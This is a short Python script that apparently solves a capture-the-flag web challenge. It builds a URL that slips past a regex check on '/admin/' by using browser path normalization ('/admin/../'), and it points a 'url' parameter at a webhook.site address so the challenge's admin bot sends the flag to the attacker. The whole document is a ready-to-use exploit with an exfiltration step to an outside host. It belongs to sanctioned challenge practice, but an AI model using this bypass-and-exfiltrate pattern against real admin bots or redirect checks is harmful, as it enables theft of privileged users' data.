#!/usr/bin/env python3

import sys
from urllib.parse import quote

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <your_webhook_url>")
    print(f"Example: {sys.argv[0]} https://webhook.site/xxxx/?flag=")
    sys.exit(1)

webhook = sys.argv[1]

# Official challenge domain from admin-bot.js
base = "https://chained.tjc.tf"

# Path normalization bypass:
# Regex sees /admin/
# Browser normalizes /admin/../ to /
payload = f"{base}/admin/../?url={webhook}"

print("[+] Submit this URL to the admin bot:")
print(payload)
print()
print("[+] Then check your webhook logs for the flag.")
